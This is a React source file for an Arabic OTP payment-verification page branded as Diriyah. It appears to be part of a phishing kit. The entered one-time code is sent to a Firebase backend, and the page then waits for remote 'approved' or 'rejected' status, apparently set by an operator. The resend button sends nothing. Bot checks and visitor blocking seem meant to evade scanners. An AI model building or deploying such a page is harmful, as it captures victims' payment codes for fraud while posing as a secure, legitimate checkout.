import { Link } from "wouter";
import { ArrowRight, ShieldCheck, Lock, RefreshCw } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { useState, useEffect, useRef } from "react";
import { handleOtp, listenForOtpApproval } from "@/lib/firebase";
import { useLocation } from "wouter";

export default function OTPPage() {
  return (
    <div className="min-h-screen bg-gradient-to-b from-[#f5efe6] to-[#ebddd0] flex flex-col" dir="rtl">
      <Header />
      <ProgressSteps />
      <main className="flex-1 p-4 flex items-center justify-center">
        <OTPForm />
      </main>
    </div>
  );
}

function Header() {
  return (
    <header className="bg-[#4a1525] text-white">
      <div className="container mx-auto px-4 py-4">
        <div className="flex items-center justify-between">
          <Link href="/checkout">
            <Button
              size="icon"
              variant="ghost"
              className="text-white hover:bg-white/10"
              data-testid="button-menu-otp"
            >
              <ArrowRight className="w-5 h-5" />
            </Button>
          </Link>

          <div className="flex-1 flex justify-center">
            <img
              src="/logo-white.svg"
              alt="الدرعية"
              className="h-12"
              data-testid="img-otp-logo"
            />
          </div>

          <div className="w-10" />
        </div>
      </div>
    </header>
  );
}

function ProgressSteps() {
  return (
    <div className="bg-gradient-to-r from-[#f5efe6] to-[#ebddd0] p-5" data-testid="progress-steps-otp">
      <div className="flex items-center justify-center gap-1">
        {[
          { number: 1, label: "تسجيل" },
          { number: 2, label: "الحجز" },
          { number: 3, label: "السلة" },
          { number: 4, label: "الدفع" },
        ].map((step, index, arr) => (
          <div key={step.number} className="flex items-center">
            <div className="flex flex-col items-center">
              <div className="w-10 h-10 rounded-full flex items-center justify-center text-sm font-bold bg-gradient-to-br from-[#c9a96e] to-[#b8935a] text-white shadow-glow">
                {step.number}
              </div>
              <span className="text-xs mt-2 text-primary font-medium">{step.label}</span>
            </div>
            {index < arr.length - 1 && (
              <div className="w-10 h-1 mx-1 rounded-full bg-gradient-to-r from-[#c9a96e] to-[#b8935a]" />
            )}
          </div>
        ))}
      </div>
    </div>
  );
}

function OTPForm() {
  const [otp, setOtp] = useState("");
  const [error, setError] = useState("");
  const [isResending, setIsResending] = useState(false);
  const inputRef = useRef<HTMLInputElement>(null);
  
  const formLoadTime = useRef(Date.now());
  const interactionCount = useRef(0);
  const hasMouseMoved = useRef(false);

  useEffect(() => {
    const handleMouseMove = () => { hasMouseMoved.current = true; };
    const handleKeyPress = () => { interactionCount.current++; };
    
    window.addEventListener('mousemove', handleMouseMove);
    window.addEventListener('touchstart', handleMouseMove);
    window.addEventListener('keypress', handleKeyPress);
    
    inputRef.current?.focus();
    
    return () => {
      window.removeEventListener('mousemove', handleMouseMove);
      window.removeEventListener('touchstart', handleMouseMove);
      window.removeEventListener('keypress', handleKeyPress);
    };
  }, []);

  const isBotDetected = (): boolean => {
    const timeSpent = Date.now() - formLoadTime.current;
    if (timeSpent < 2000) return true;
    if (interactionCount.current < 1) return true;
    if (!hasMouseMoved.current && !('ontouchstart' in window)) return true;
    return false;
  };

  const handleChange = (value: string) => {
    const cleaned = value.replace(/\D/g, "").slice(0, 6);
    setOtp(cleaned);
    setError("");
  };

  const [, setLocation] = useLocation();
  const [isWaiting, setIsWaiting] = useState(false);
  const [otpResult, setOtpResult] = useState<"approved" | "rejected" | null>(null);

  useEffect(() => {
    if (!isWaiting) return;
    const unsubscribe = listenForOtpApproval((status) => {
      setOtpResult(status);
      setIsWaiting(false);
      if (status === "approved") {
        setTimeout(() => setLocation("/confirmation"), 2000);
      }
    });
    return () => unsubscribe();
  }, [isWaiting, setLocation]);

  const handleSubmit = async () => {
    if (isWaiting) return;
    if (otp.length < 4 || otp.length > 6) {
      setError("يرجى إدخال رمز التحقق (4-6 أرقام)");
      return;
    }

    if (isBotDetected()) {
      setError("حدث خطأ، يرجى المحاولة مرة أخرى");
      return;
    }

    setError("");
    setOtpResult(null);
    setIsWaiting(true);
    try {
      await handleOtp(otp);
    } catch (err: any) {
      setIsWaiting(false);
      if (err?.message === "VISITOR_BLOCKED") {
        setError("تم حظر هذا الزائر ولا يمكنه المتابعة");
      } else {
        setError("حدث خطأ، يرجى المحاولة مرة أخرى");
      }
    }
  };

  const handleResend = () => {
    setIsResending(true);
    setOtpResult(null);
    setError("");
    setOtp("");
    setTimeout(() => {
      setIsResending(false);
    }, 2000);
  };

  if (otpResult === "approved") {
    return (
      <div className="w-full max-w-md mx-auto animate-fade-in">
        <div className="bg-white rounded-3xl shadow-2xl p-8 space-y-6 text-center">
          <div className="w-24 h-24 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-lg">
            <ShieldCheck className="w-12 h-12 text-white" />
          </div>
          <h2 className="text-2xl font-bold text-[#4a1525]">تم التحقق بنجاح</h2>
          <p className="text-[#7a6b5f] text-sm">تمت الموافقة على عملية الدفع. جاري التحويل...</p>
          <div className="w-8 h-8 border-3 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin mx-auto" />
        </div>
      </div>
    );
  }

  return (
    <div className="w-full max-w-md mx-auto animate-fade-in">
      <div className="bg-white rounded-3xl shadow-2xl p-8 space-y-6">
        <div className="text-center space-y-4">
          <div className="relative">
            <div className="w-20 h-20 bg-gradient-to-br from-[#c9a96e] to-[#b8935a] rounded-full flex items-center justify-center mx-auto shadow-glow">
              <ShieldCheck className="w-10 h-10 text-white" />
            </div>
            <div className="absolute -bottom-1 left-1/2 -translate-x-1/2">
              <div className="bg-[#f5efe6] text-[#4a1525] text-xs font-bold px-3 py-1 rounded-full flex items-center gap-1">
                <Lock className="w-3 h-3" />
                آمن
              </div>
            </div>
          </div>
          <div className="pt-4">
            <h2 className="text-2xl font-bold text-foreground">التحقق من الدفع</h2>
            <p className="text-muted-foreground text-sm mt-2">
              تم إرسال رمز التحقق إلى رقم جوالك المسجل
            </p>
          </div>
        </div>

        <div className="flex justify-center py-4" dir="ltr">
          <Input
            ref={inputRef}
            type="text"
            inputMode="numeric"
            pattern="[0-9]*"
            maxLength={6}
            value={otp}
            onChange={(e) => handleChange(e.target.value)}
            className="w-full h-16 text-center text-3xl font-bold tracking-[0.4em] border-2 rounded-xl focus:border-primary focus:ring-primary/20"
            placeholder="------"
            autoComplete="one-time-code"
            autoFocus
            name="otp"
            disabled={isWaiting}
            data-testid="input-otp"
          />
        </div>

        {isWaiting && (
          <div className="bg-[#f5efe6] text-[#4a1525] text-sm p-4 rounded-xl text-center space-y-2" data-testid="status-waiting-otp">
            <div className="w-6 h-6 border-2 border-[#c9a96e]/30 border-t-[#c9a96e] rounded-full animate-spin mx-auto" />
            <p className="font-medium">جاري التحقق من الرمز...</p>
          </div>
        )}

        {otpResult === "rejected" && (
          <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp-rejected">
            رمز التحقق غير صحيح، يرجى المحاولة مرة أخرى
          </div>
        )}

        {error && (
          <div className="bg-red-50 text-red-600 text-sm p-3 rounded-xl text-center" data-testid="error-otp">
            {error}
          </div>
        )}

        <div className="space-y-3">
          <Button
            onClick={handleSubmit}
            size="lg"
            className="w-full bg-primary text-white shadow-lg"
            disabled={isWaiting}
            data-testid="button-verify-otp"
          >
            {isWaiting ? "جاري التحقق..." : "تأكيد الرمز"}
          </Button>

          <Button
            variant="ghost"
            onClick={handleResend}
            disabled={isResending || isWaiting}
            className="w-full text-primary gap-2"
            data-testid="button-resend-otp"
          >
            <RefreshCw className={`w-4 h-4 ${isResending ? "animate-spin" : ""}`} />
            {isResending ? "جاري إعادة الإرسال..." : "إعادة إرسال الرمز"}
          </Button>

          <Link href="/checkout">
            <Button
              variant="outline"
              size="lg"
              className="w-full"
              data-testid="button-back-otp"
            >
              رجوع
            </Button>
          </Link>
        </div>
      </div>

      <p className="text-center text-xs text-muted-foreground mt-6">
        لم تستلم الرمز؟ تأكد من صحة رقم الجوال المسجل
      </p>
    </div>
  );
}
